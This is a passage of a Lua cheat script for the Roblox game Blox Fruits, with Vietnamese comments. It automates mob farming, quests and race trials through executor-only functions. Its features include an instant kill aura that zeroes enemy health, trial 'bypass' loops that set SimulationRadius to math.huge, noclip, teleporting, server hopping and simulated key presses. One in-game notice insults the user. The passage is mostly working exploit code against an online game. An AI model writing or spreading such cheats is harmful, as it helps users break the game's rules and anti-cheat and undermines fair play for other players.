            if game.PlaceId == 4442272183 then
                if Value == false then
                    CancelTween()
                end
                SaveSettings("Auto Cyborg", Value)
            elseif Value then
                return Notify("Script Warning", "Dit Me may bi ngu a? da bao o sea 2 roi", 10)
            end
        end
    }
)
function BuyChipLaw()
    v354 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
    if v354 == 1 then
        return true
    end
    if v354 == 0 then
        return false
    end
    if v354 == 2 then
        return true
    end
end
function CheckSkillMastery()
    if not Settings["TypeMasteryFarm"] then return end
    if Settings["TypeMasteryFarm"] == "Devil Fruit" then 
        MasteryWeapon = game:GetService("Players").LocalPlayer.Data.DevilFruit.Value
    elseif Settings["TypeMasteryFarm"] == "Gun" then 
        MasteryWeapon = ""
        BackpackandCharacter = {
            game.Players.LocalPlayer.Backpack,
            game.Players.LocalPlayer.Character
        }
        for _,folder in pairs(BackpackandCharacter) do 
            for i,v in pairs(folder:GetChildren()) do 
                if v:IsA("Tool") and v.ToolTip == "Gun" then 
                    MasteryWeapon = v.Name 
                end
            end
        end
    end
    if MasteryWeapon and MasteryWeapon ~= "" then 
        if game.Players.LocalPlayer.Backpack:FindFirstChild(MasteryWeapon) or game.Players.LocalPlayer.Character:FindFirstChild(MasteryWeapon) then 
            if game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(MasteryWeapon) then 
                for i, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[MasteryWeapon]:GetChildren() do
                    if v:IsA("Frame") then
                        if table.find(RealSkillSelected,v.Name) and v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                                v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                                v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
                        then
                            return MasteryWeapon, v.Name
                        end
                    end
                end
            else
                EquipWeaponName(MasteryWeapon)
            end
        end
    end
    gunlon = Settings["TypeMasteryFarm"] == "Gun"
    if gunlon then return MasteryWeapon, nil end
end
-- local KillMob = ThangchaMay("crackdum_4")["KillMob"]
function KillMob(Mob, kkk)
    pcall(function()
        Mob3 = Mob 
        if type(Mob3) == "table" and kkk then
            if CheckMob(Mob3) then
                Mob = CheckMob(Mob3)
                if Mob and Mob:FindFirstChild("Humanoid") and Mob:FindFirstChild("HumanoidRootPart") and Mob.Humanoid.Health > 0 then
                    LockCFrame = Mob.HumanoidRootPart.CFrame
                    repeat
                        task.wait()
                        if
                            Mob and Mob:FindFirstChild("Humanoid") and Mob:FindFirstChild("HumanoidRootPart") and
                                Mob.Humanoid.Health > 0
                            then
                            spawn(
                                function()
                                    BringMobChoosen = Mob
                                end
                            )
                            spawn(
                                function()
                                    pcall(function()
                                        BringMobCFrame = Mob.HumanoidRootPart.CFrame
                                    end)
                                end
                            )
                            --spawn(function() while task.wait() do if Mob then NoClip = true else NoClip = false end end end)
                            spawn(function () pcall(function() EquipWeapon() end) end)
                            spawn(function () pcall(function() EnableBuso() end) end)
                            StartBringMob = true
                            Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0))
                            NoClip = true
                            if Settings["Mastery Farm"] and Settings["%HealthSendSkill"] and Mob.Humanoid.MaxHealth < 200000 then 
                                donandngu = Mob.Humanoid.Health <= (Mob.Humanoid.MaxHealth*Settings["%HealthSendSkill"])/100
                                if donandngu then 
                                    UseFastAttack= false
                                    repeat 
                                        gggggg,ggg2 = CheckSkillMastery()
                                        spawn(pcall(Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1), 1)
                                        donandngu = Mob.Humanoid.Health <= (Mob.Humanoid.MaxHealth*Settings["%HealthSendSkill"])/100
                                        UseFastAttack= false
                                        AimBotSkillPosition = Mob.HumanoidRootPart.Position
                                        AimbotDiThangNgu = true 
                                        spawn(function()
                                            if Settings["TypeMasteryFarm"] == "Gun" and CheckSkillMastery() then 
                                                EquipWeaponName(gggggg)
                                                game:GetService("VirtualUser"):CaptureController()
                                                game:GetService("VirtualUser"):Button1Down(Vector2.new(1280, 672))
                                                local args = {
                                                    [1] = Mob.HumanoidRootPart.Position,
                                                    [2] = Mob.HumanoidRootPart
                                                }
                                                game:GetService("Players").LocalPlayer.Character[gggggg].RemoteFunctionShoot:InvokeServer(unpack(args))
                                            end
                                        end) 
                                        spawn(pcall(Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1), 1)
                                        EquipWeaponName(gggggg)
                                        spawn(pcall(Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1), 1)
                                        if gggggg and ggg2 then 
                                            EquipWeaponName(gggggg)
                                            SendKey(ggg2)
                                            NoClip = true 
                                            task.wait(.2)   
                                        end
                                    until not donandngu or not Mob or not Mob:FindFirstChild("Humanoid") or not Mob:FindFirstChild("HumanoidRootPart") or Mob.Humanoid.Health <= 0 or IngoreFarm or CheckIsRaiding()
                                    gggggg,ggg2 = nil
                                    AimbotDiThangNgu = false
                                    AimBotSkillPosition = nil
                                else
                                    UseFastAttack = true
                                end
                            else
                                UseFastAttack = true
                            end
                        else
                            task.wait()
                        end
                    until not Mob or not Mob:FindFirstChild("Humanoid") or not Mob:FindFirstChild("HumanoidRootPart") or
                        Mob.Humanoid.Health <= 0 or CheckIsRaiding()
                    UseFastAttack = false
                    NoClip = false
                    AimbotDiThangNgu = false
                    AimBotSkillPosition = nil
                end
            else
                MobSLCSpawnssss = {}
                if string.find(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()[1].Name, "Lv.") then
                    MobSLCSpawnssss = Mob
                else
                    for i, v in pairs(Mob) do
                        table.insert(MobSLCSpawnssss, tostring(v:gsub(" %pLv. %d+%p", "")))
                    end
                end
                for i, v in pairs(MobSLCSpawnssss) do
                    if GetMobSpawn(v) and not CheckMob(Mob3) then 
                        MobSpawn = GetMobSpawn(v)
                        EnableBuso()
                        EquipWeapon()
                        if MobSpawn:IsA("Part") and not CheckMob(Mob3) then
                            Tweento(MobSpawn.CFrame * CFrame.new(0, 20, 8))
                        elseif MobSpawn:FindFirstChild("HumanoidRootPart") and not CheckMob(Mob3) then
                            Tweento(MobSpawn.HumanoidRootPart.CFrame * CFrame.new(0, 8, 8))
                        end
                    end
                    --[[
                    if game.Workspace.MobSpawns:FindFirstChild(v) then
                        MobSpawn = game.Workspace.MobSpawns[v]
                        if not CheckMob(Mob) and MobSpawn then
                            EnableBuso()
                            EquipWeapon()
                            if MobSpawn:IsA("Part") then
                                Tweento(MobSpawn.CFrame * CFrame.new(0, 20, 8))
                            elseif MobSpawn:FindFirstChild("HumanoidRootPart") then
                                Tweento(MobSpawn.HumanoidRootPart.CFrame * CFrame.new(0, 8, 8))
                            end
                        end
                    else
                        FunctionFoldermob()
                    end
                    ]]
                end
            end
        else
            if Mob and Mob:FindFirstChild("Humanoid") and Mob:FindFirstChild("HumanoidRootPart") and Mob.Humanoid.Health > 0 then
                LockCFrame = Mob.HumanoidRootPart.CFrame
                repeat
                    task.wait()
                    if
                        Mob and Mob:FindFirstChild("Humanoid") and Mob:FindFirstChild("HumanoidRootPart") and
                            Mob.Humanoid.Health > 0
                        then
                        spawn(
                            function()
                                BringMobChoosen = Mob
                            end
                        )
                        spawn(
                            function()
                                pcall(function()
                                    BringMobCFrame = Mob.HumanoidRootPart.CFrame
                                end)
                            end
                        )
                        --spawn(function() while task.wait() do if Mob then NoClip = true else NoClip = false end end end)
                        spawn(function () pcall(function() EquipWeapon() end) end)
                        spawn(function () pcall(function() EnableBuso() end) end)
                        StartBringMob = true
                        Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0))
                        NoClip = true
                        if Settings["Mastery Farm"] and Settings["%HealthSendSkill"] and Mob.Humanoid.MaxHealth < 200000 then 
                            donandngu = Mob.Humanoid.Health <= (Mob.Humanoid.MaxHealth*Settings["%HealthSendSkill"])/100
                            if donandngu then 
                                UseFastAttack= false
                                repeat 
                                    gggggg,ggg2 = CheckSkillMastery()
                                    spawn(pcall(Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1), 1)
                                    donandngu = Mob.Humanoid.Health <= (Mob.Humanoid.MaxHealth*Settings["%HealthSendSkill"])/100
                                    UseFastAttack= false
                                    AimBotSkillPosition = Mob.HumanoidRootPart.Position
                                    AimbotDiThangNgu = true 
                                    spawn(function()
                                        if Settings["TypeMasteryFarm"] == "Gun" and CheckSkillMastery() then 
                                            EquipWeaponName(gggggg)
                                            game:GetService("VirtualUser"):CaptureController()
                                            game:GetService("VirtualUser"):Button1Down(Vector2.new(1280, 672))
                                            local args = {
                                                [1] = Mob.HumanoidRootPart.Position,
                                                [2] = Mob.HumanoidRootPart
                                            }
                                            game:GetService("Players").LocalPlayer.Character[gggggg].RemoteFunctionShoot:InvokeServer(unpack(args))
                                        end
                                    end) 
                                    spawn(pcall(Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1), 1)
                                    NoClip = true
                                    EquipWeaponName(gggggg)
                                    spawn(pcall(Tweento(Mob.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1), 1)
                                    if gggggg and ggg2 then 
                                        EquipWeaponName(gggggg)
                                        SendKey(ggg2)
                                        NoClip = true 
                                        task.wait(.2)   
                                    end
                                until not donandngu or not Mob or not Mob:FindFirstChild("Humanoid") or not Mob:FindFirstChild("HumanoidRootPart") or Mob.Humanoid.Health <= 0 or IngoreFarm or CheckIsRaiding()
                                gggggg,ggg2 = nil
                                AimbotDiThangNgu = false
                                AimBotSkillPosition = nil
                            else
                                UseFastAttack = true
                            end
                        else
                            UseFastAttack = true
                        end
                    else
                        task.wait()
                    end
                until not Mob or not Mob:FindFirstChild("Humanoid") or not Mob:FindFirstChild("HumanoidRootPart") or
                    Mob.Humanoid.Health <= 0 or CheckIsRaiding()
                UseFastAttack = false
                NoClip = false
                AimbotDiThangNgu = false
                AimBotSkillPosition = nil
            end
        end
    end)
end
function CheckPlayerBackpack(mb)
    k = game.Players.LocalPlayer.Backpack
    k2 = game.Players.LocalPlayer.Character
    for i, v in pairs(k:GetChildren()) do
        if v.Name == tostring(mb) then
            return true
        end
    end
    for i, v in pairs(k2:GetChildren()) do
        if v.Name == tostring(mb) then
            return true
        end
    end
end
function CheckMicrochip()
    if CheckPlayerBackpack("Microchip") then
        return true
    end
end
function CheckCoreBrain()
    if CheckPlayerBackpack("Core Brain") then
        return true
    end
end
spawn(
    function()
        while task.wait() do
            if Settings["Auto Cyborg"] then
                CyborgCheck = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CyborgTrainer", "Check")
                if CyborgCheck == 2 then
                    break
                end
                if not CyborgCheck then
                    if not game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector.CanCollide then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CyborgTrainer", "Buy")
                    else
                        if CheckCoreBrain() then
                            fireclickdetector(
                                game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector
                            )
                        else
                            if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckBlockPart") then
                            elseif game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckBlockPart") then
                                if CheckBoss("Order [Lv. 1250] [Raid Boss]") then
                                    Target = ReturnBosses("Order [Lv. 1250] [Raid Boss]")
                                    KillMob(Target)
                                else
                                    if not CheckMicrochip() and game.Players.LocalPlayer.Data.Fragments.Value >= 1000 then
                                        BuyChipLaw()
                                    elseif CheckMicrochip() then
                                        fireclickdetector(
                                            game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector
                                        )
                                    end
                                end
                            else
                                fireclickdetector(
                                    game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector
                                )
                            end
                        end
                    end
                end
            end
        end
    end
)
EctoplasmMobs = {
    "Ship Deckhand [Lv. 1250]",
    "Ship Engineer [Lv. 1275]",
    "Ship Steward [Lv. 1300]"
}
DoughBoss = {
    "Dough King [Lv. 2300] [Raid Boss]",
    "Cake Prince [Lv. 2300] [Raid Boss]",
    "rip_indra True Form [Lv. 5000] [Raid Boss]"
}
MobsCakePrince = {
    "Cookie Crafter [Lv. 2200]",
    "Cake Guard [Lv. 2225]",
    "Baking Staff [Lv. 2250]",
    "Head Baker [Lv. 2275]"
}
CocoaMobs = {
    "Cocoa Warrior [Lv. 2300]",
    "Chocolate Bar Battler [Lv. 2325]"
}
task.spawn(
    function()
        while task.wait() do
            if AutoGhoulQuest then
                if not string.find(game.Players.LocalPlayer.Data.Race.Value, "Ghoul") then
                    Ectoplasm = CheckMaterialCount("Ectoplasm")
                    if Ectoplasm < 100 then
                        ----print("memayngu")
                        StartBringMob = false
                        if CheckMob(EctoplasmMobs) then
                            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                                if
                                    AutoGhoulQuest and table.find(EctoplasmMobs, v.Name) and
                                        v:FindFirstChild("Humanoid") and
                                        v:FindFirstChild("HumanoidRootPart") and
                                        v.Humanoid.Health > 0
                                 then
                                    repeat
                                        KillMob(v)
                                    until not AutoGhoulQuest or not v or not v:FindFirstChild("Humanoid") or
                                        not v:FindFirstChild("HumanoidRootPart") or
                                        v.Humanoid.Health <= 0
                                    UseFastAttack = false
                                    StartBringMob = false
                                    NoClip = false
                                end
                            end
                        else
                            for i, v in pairs(EctoplasmMobsSpawn) do
                                if game.Workspace.MobSpawns:FindFirstChild(v) then
                                    MobSpawn = game.Workspace.MobSpawns[v]
                                    if not CheckMob(EctoplasmMobs) and AutoGhoulQuest and MobSpawn then
                                        EnableBuso()
                                        EquipWeapon()
                                        if MobSpawn:IsA("Part") then
                                            Tweento(MobSpawn.CFrame * CFrame.new(0, 20, 8))
                                        elseif MobSpawn:FindFirstChild("HumanoidRootPart") then
                                            Tweento(MobSpawn.HumanoidRootPart.CFrame * CFrame.new(0, 8, 8))
                                        end
                                    end
                                else
                                    FunctionFoldermob()
                                end
                            end
                        end
                    elseif AutoGhoulQuest then
                        if
                            game.Players.LocalPlayer.Backpack:FindFirstChild("Hellfire Torch") or
                                game.Players.LocalPlayer.Character:FindFirstChild("Hellfire Torch")
                         then
                            Tweento(
                                CFrame.new(
                                    918.615234,
                                    122.202454,
                                    33454.3789,
                                    -0.999998808,
                                    0,
                                    0.00172644004,
                                    0,
                                    1,
                                    0,
                                    -0.00172644004,
                                    0,
                                    -0.999998808
                                )
                            )
                            local args = {
                                [1] = "Ectoplasm",
                                [2] = "BuyCheck",
                                [3] = 4
                            }
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                            v352 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 4)
                            if v352 == 1 then
                                Notify("Script Status", "Sucess Trade For Ghoul Race.\nBreaking Function....", 30)
                                break
                            elseif v352 == 2 then
                                Notify("Script Status", "Already Got Ghoul Race.\nBreaking Function....", 30)
                                break
                            end
                        else
                            if CheckBoss("Cursed Captain [Lv. 1325] [Raid Boss]") then
                                ----print("Turn Off Fast Attack6")
                                Target = ReturnBosses("Cursed Captain [Lv. 1325] [Raid Boss]")
                                repeat
                                    wait()
                                    if
                                        game.Workspace.Enemies:FindFirstChild(Target.Name) and
                                            Target:FindFirstChild("Humanoid") and
                                            Target:FindFirstChild("HumanoidRootPart") and
                                            Target.Humanoid.Health > 0
                                     then
                                        KillMob(Target)
                                    else
                                        pcall(
                                            function()
                                                Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0))
                                            end
                                        )
                                    end
                                until not AutoGhoulQuest or not Target or not Target:FindFirstChild("Humanoid") or
                                    not Target:FindFirstChild("HumanoidRootPart") or
                                    Target.Humanoid.Health <= 0
                                UseFastAttack = false
                            elseif Settings["HopOption"] then
                                pcall(
                                    function()
                                        Tweento(CFrame.new(-385.250916, 73.0458984, 297.388397))
                                    end
                                )
                                HopServer()
                                task.wait(5)
                            end
                        end
                    end
                end
            end
        end
    end
)
function CheckRace()
    local v113 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
    local v111 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
    if game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
        return game:GetService("Players").LocalPlayer.Data.Race.Value .. " V4"
    end
    if v113 == -2 then
        return game:GetService("Players").LocalPlayer.Data.Race.Value .. " V3"
    end
    if v111 == -2 then
        return game:GetService("Players").LocalPlayer.Data.Race.Value .. " V2"
    end
    return game:GetService("Players").LocalPlayer.Data.Race.Value .. " V1"
end
function checkseabeast()
    for i, v in next, game:GetService("Workspace").SeaBeasts:GetChildren() do
        if v.Name == "SeaBeast1" then
            local s = v.HealthBBG.Frame.TextLabel.Text
            local x = s:gsub("/%d+,%d+", "")
            local a = v.HealthBBG.Frame.TextLabel.Text
            local b
            if string.find(x, ",") then
                b = a:gsub("%d+,%d+/", "")
            else
                b = a:gsub("%d+/", "")
            end
            local c = b:gsub(",", "")
            if tonumber(c) >= 34500 then
                return v
            end
        end
    end
    return false
end
local plr = game.Players.LocalPlayer
function checkboat()
    for i, v in next, game:GetService("Workspace").Boats:GetChildren() do
        if v:IsA("Model") then
            if
                v:FindFirstChild("Owner") and tostring(v.Owner.Value) == game:GetService("Players").LocalPlayer.Name and
                    v.Humanoid.Value > 0
             then
                return v
            end
        end
    end
    return false
end
function TeleportSeabeast(x)
    getgenv().noclip = true
    local a = Vector3.new(0, x:FindFirstChild("HumanoidRootPart").Position.Y, 0)
    local b = Vector3.new(0, game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y, 0)
    if (a - b).Magnitude <= 175 then
        ----print("True dieu kien")
        Tweento(x.HumanoidRootPart.CFrame * CFrame.new(0, 300, 50))
    else
        ----print("Else")
        Tweento(
            CFrame.new(
                x.HumanoidRootPart.Position.X,
                game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y + 200,
                x.HumanoidRootPart.Position.Z
            )
        )
    end
end


function equipweapon(name)
    local tool1 = tostring(name)
    local tool2 = game.Players.LocalPlayer.Backpack:FindFirstChild(tool1)
    local humanoid1 =
        game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") or
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
    if tool2 then
        humanoid1:EquipTool(tool2)
    end
end
function checkskillMelee()
    if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(NameMelee()) then
        equipweapon(NameMelee())
        return false
    end
    for i, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[NameMelee()]:GetChildren() do
        if v:IsA("Frame") then
            if
                v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
             then
                return v.Name
            end
        end
    end
end
CFrameDiemSang1 =
    CFrame.new(
    28724.8262,
    14887.8779,
    -39.1229477,
    0.930049777,
    9.39140179e-08,
    0.367433578,
    -1.05311393e-07,
    1,
    1.09702034e-08,
    -0.367433578,
    -4.88977783e-08,
    0.930049777
)
CFrameDiemSang2 =
    CFrame.new(
    28884.6191,
    14890.4756,
    34.8808327,
    -0.999746561,
    4.23654107e-08,
    -0.0225136708,
    4.2685226e-08,
    1,
    -1.37247813e-08,
    0.0225136708,
    -1.46823034e-08,
    -0.999746561
)
CFrameDiemSang3 =
    CFrame.new(
    28904.5352,
    14890.377,
    -84.37677,
    0.158448055,
    -2.97816154e-08,
    0.987367332,
    -2.27443113e-08,
    1,
    3.3812551e-08,
    -0.987367332,
    -2.78145222e-08,
    0.158448055
)
if Sea3 then 
    CFrameDiemSang4 = workspace.Map["Temple of Time"].Prompt.CFrame
end
function checkskillDF()
    if
        not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(
            game:GetService("Players").LocalPlayer.Data.DevilFruit.Value
        )
     then
        equipweapon(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value)
        return false
    end
    for i, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[
        game:GetService("Players").LocalPlayer.Data.DevilFruit.Value
    ]:GetChildren() do
        if v:IsA("Frame") then
            if
                v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
             then
                return v.Name
            end
        end
    end
end
function checkskillSword()
    if not NameSword() then
        return
    end
    if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(NameSword()) then
        equipweapon(NameSword())
        return false
    end
    for i, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[NameSword()]:GetChildren() do
        if v:IsA("Frame") then
            if
                v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
             then
                return v.Name
            end
        end
    end
end
function NameGun()
    dick = game.Players.LocalPlayer.Backpack or game.Players.LocalPlayer.Character
    for i, v in pairs(dick:GetChildren()) do
        if v:IsA("Tool") and v.ToolTip == "Gun" then
            return v.Name
        end
    end
end
function checkskillGun()
    if not NameGun() then
        return nil
    end
    if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(NameGun()) then
        equipweapon(NameGun())
        return false
    end
    for i, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[NameGun()]:GetChildren() do
        if v:IsA("Frame") then
            if
                v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
             then
                return v.Name
            end
        end
    end
end
function SendKey(key, holdtime)
    if key then
        if not holdtime then
            game:service("VirtualInputManager"):SendKeyEvent(true, key, false, game)
            task.wait()
            game:service("VirtualInputManager"):SendKeyEvent(false, key, false, game)
        elseif holdtime then
            game:service("VirtualInputManager"):SendKeyEvent(true, key, false, game)
            task.wait(holdtime)
            game:service("VirtualInputManager"):SendKeyEvent(false, key, false, game)
        end
    end
end
function autoskill()
    EnableBuso()
    sword = checkskillSword()
    meele = checkskillMelee()
    df = checkskillDF()
    gun = checkskillGun()
    if
        df and Settings["Spam_DF"] and
            not string.find(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value, "Portal") and
            df ~= "F"
     then
        print("DF")
        EquipWeaponName(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value)
        local condimebeo = checkskillDF()
        if condimebeo then
            SendKey(condimebeo)
        end
    elseif checkskillMelee() and Settings["Spam_Melee"] then
        print("Melee")
        EquipWeaponName(NameMelee())
        local condimebeo = checkskillMelee()
        if condimebeo then
            SendKey(condimebeo)
        end
    elseif checkskillSword() and Settings["Spam_Sword"] then
        print("Sword")
        EquipWeaponName(NameSword())
        local condimebeo = checkskillSword()
        if condimebeo then
            SendKey(condimebeo)
        end
    elseif checkskillGun() and Settings["Spam_Gun"] then
        print("Gun")
        EquipWeaponName(NameGun())
        if condimebeo then
            SendKey(condimebeo)
        end
    else
        EquipAllWeapon()
    end
end
function GetSeaBeastTrial()
    if not game.Workspace.Map:FindFirstChild("FishmanTrial") then
        autospamskill = nil
        return nil
    end
    if game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Trial of Water") then
        FishmanTrial = game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Trial of Water")
    end
    if FishmanTrial then
        for i, v in next, game:GetService("Workspace").SeaBeasts:GetChildren() do
            if
                string.find(v.Name, "SeaBeast") and v:FindFirstChild("HumanoidRootPart") and
                    (v.HumanoidRootPart.Position - FishmanTrial.Position).Magnitude <= 1500
             then
                if v.Health.Value > 0 then
                    return v
                end
            end
        end
    end
end
task.spawn(
    function()
        while wait() do
            if Settings["BypassTrial_Fish"] then
                if
                    GetSeaBeastTrial() and
                        (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
                            GetSeaBeastTrial().HumanoidRootPart.Position).Magnitude <= 2000
                 then
                    if game.Workspace.Map:FindFirstChild("FishmanTrial") then
                        pcall(
                            function()
                                Stats_Melee = game:GetService("Players").LocalPlayer.Data.Stats.Melee.Level.Value
                            end
                        )
                        pcall(
                            function()
                                Stats_DF = game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value
                            end
                        )
                        pcall(
                            function()
                                Stats_Gun = game:GetService("Players").LocalPlayer.Data.Stats.Gun.Level.Value
                            end
                        )
                        pcall(
                            function()
                                Stats_Sword = game:GetService("Players").LocalPlayer.Data.Stats.Sword.Level.Value
                            end
                        )
                        if Stats_Melee and Stats_Melee > 1 then
                            ToggleSpamMelee:Set(true)
                        end
                        if Stats_DF and Stats_DF > 1 then
                            ToggleSpamDF:Set(true)
                        end
                        if Stats_Sword and Stats_Sword > 1 then
                            ToggleSpamSword:Set(true)
                        end
                        if Stats_Gun and Stats_Gun > 1 then
                            ToggleSpamGun:Set(true)
                        end
                        spawn(TeleportSeabeast(GetSeaBeastTrial()), 1)
                        getgenv().psskill = GetSeaBeastTrial().HumanoidRootPart.CFrame
                        autospamskill = true
                    else
                        getgenv().psskill = nil
                        autospamskill = false
                    end
                else
                    getgenv().psskill = nil
                    autospamskill = false
                end
            end
        end
    end
)

task.spawn(
    function()
        while task.wait() do
            task.wait()
            if BypassTrial_Human then
                if
                    game:GetService("Workspace").Map:FindFirstChild("HumanTrial") and
                        game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Trial of Strength")
                 then
                    StrengthPart = game:GetService("Workspace")["_WorldOrigin"].Locations["Trial of Strength"].CFrame
                    if
                        (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - StrengthPart.Position).Magnitude <=
                            1000
                     then
                        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                            if
                                v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
                                    (v.HumanoidRootPart.Position - StrengthPart.Position).Magnitude <= 200
                             then
                                repeat wait()
                                    pcall(
                                        function()
                                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                            v.Humanoid.Health = 0
                                        end
                                    )
                                until not v or not v:FindFirstChild("Humanoid") or v.Humanoid.Health <= 0 
                            end
                        end
                    end
                end
            end
        end
    end
)
spawn(
    function()
        while wait() do
            for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
                if
                    Settings["InstantKillAura"] and v:FindFirstChild("Humanoid") and
                        v:FindFirstChild("HumanoidRootPart") and
                        (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
                            1500 and
                        v.Humanoid.Health > 0
                 then
                    v.Humanoid.Health = 0
                end
            end
        end
    end
)
function BringMobGhoul()
    if
        game:GetService("Workspace").Map:FindFirstChild("GhoulTrial") and
            game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Trial of Carnage")
     then
        GhoulhPart2 =
            CFrame.new(
            -11706.6777,
            10011.5615,
            11.6579161,
            0.54723686,
            -2.79323835e-08,
            -0.83697778,
            2.69866494e-08,
            1,
            -1.57283679e-08,
            0.83697778,
            -1.3980082e-08,
            0.54723686
        )
        if GhoulhPart2 then
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if
                    GhoulhPart2 and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                        (v.HumanoidRootPart.Position - GhoulhPart2.Position).magnitude <= 1500
                 then
                    pcall(
                        function()
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                            v.Humanoid.Health = 0
                        end
                    )
                end
            end
        end
    end
end
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if Settings["BypassTrial_Ghoul"] then
                if
                    game:GetService("Workspace").Map:FindFirstChild("GhoulTrial") and
                        game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Trial of Carnage")
                 then
                    GhoulhPart = game:GetService("Workspace")["_WorldOrigin"].Locations["Trial of Carnage"].CFrame
                    --[[
                                            for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
                        if
                            v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                                (v.HumanoidRootPart.Position - GhoulhPart.Position).Magnitude < 1500 and
                                v.Humanoid.Health > 0
                        then
                            v.Humanoid.Health = 0
                        end
                    end
                    ]]
                    if
                        (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - GhoulhPart.Position).Magnitude <=
                            1000
                     then
                        BringMobGhoul()
                        if
                            GhoulhPart2 and
                                (GhoulhPart2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
                                    500
                         then
                            Tweento(GhoulhPart2 * CFrame.new(0, math.random(-15, 30), 0))
                        end
                        NoClip = true
                    --[[
                            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                            if
                                v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
                                    v.Humanoid.Health > 0 and
                                    (v.HumanoidRootPart.Position - GhoulhPart.Position).Magnitude <= 1000
                            then
                                repeat
                                    wait()
                                    EquipWeapon()
                                    EnableBuso()
                                    BringMobGhoul() 
                                    Tweento(v.HumanoidRootPart.CFrame * RandomCFrame)
                                    UseFastAttack = true
                                until not Settings["BypassTrial_Ghoul"] or not v or not v:FindFirstChild("Humanoid") or
                                    not v:FindFirstChild("HumanoidRootPart") or
                                    v.Humanoid.Health <= 0
                                UseFastAttack = false
                                ----print("Turn Off Fast Attack8")
                            end
                        end
                        ]]
                    end
                end
            end
        end
